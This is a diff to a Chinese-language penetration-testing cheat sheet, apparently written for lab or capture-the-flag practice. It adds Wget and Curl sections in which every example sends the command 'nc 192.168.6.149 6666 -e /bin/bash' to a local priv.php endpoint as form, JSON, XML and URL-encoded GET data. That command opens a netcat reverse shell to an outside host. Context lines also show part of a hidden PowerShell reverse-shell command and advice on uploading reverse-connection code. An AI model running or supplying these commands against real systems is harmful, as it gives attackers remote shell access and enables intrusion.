@@ -59,6 +59,10 @@ john -f=加密类型 -w=字典 目标文件
 
 ## hashid
 
+```bash
+#查看文件的hash类型
+```
+
 ## gobuster
 
 向服务器发送http请求，尝试访问路径并根据相应确定路径是否存在（爆破网站目录）
@@ -132,15 +136,35 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sock
 #以上都不能用的时候只能看能不能进行文件上传，上传一个服务器支持的语言的反向连接代码然后运行
 ```
 
-html一般没有普通用户写权限，但是tmp有
+## Wget
 
+```bash
+#用wget以post形式向某个网页提交表单
+#-o指定输出文件名，-代表直接标准输出在命令行上，--header指定提交类型（没有严格过滤的时候不指定，即去掉--header也可以）
+wget --header="Content-Type: application/json"
+--post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -o -
+#get形式（进行了URL编码）
+wget "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
+#下载网页信息
+wget http://127.0.0.1:8000/priv.php
+```
 
+## Curl
 
-为什么php文件不显示网页？因为php文件需要？传参才可以访问
-
-
-
-
+```bash
+#查看网页信息
+curl http://127.0.0.1:8000/priv.php
+#下载网页信息
+curl -o xxx http://127.0.0.1:8000/priv.php
+#用curl以post形式向某个网页提交表单
+curl -X POST -d "command=nc 192.168.6.149 6666 -e /bin/bash" http://127.0.0.1:8000/priv.php
+#用curl以post形式向某个网页提交json数据
+curl -X POST -H "Content-Type: application/json" -d '{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php
+#用curl以post提交xml数据
+curl -X POST -H "Content-Type: application/xml" -d '<command>nc 192.168.6.149 6666 -e /bin/bash</command>' http://127.0.0.1:8000/priv.php
+#用curl以get提交请求（进行了URL编码）
+curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
+```
 
 
 
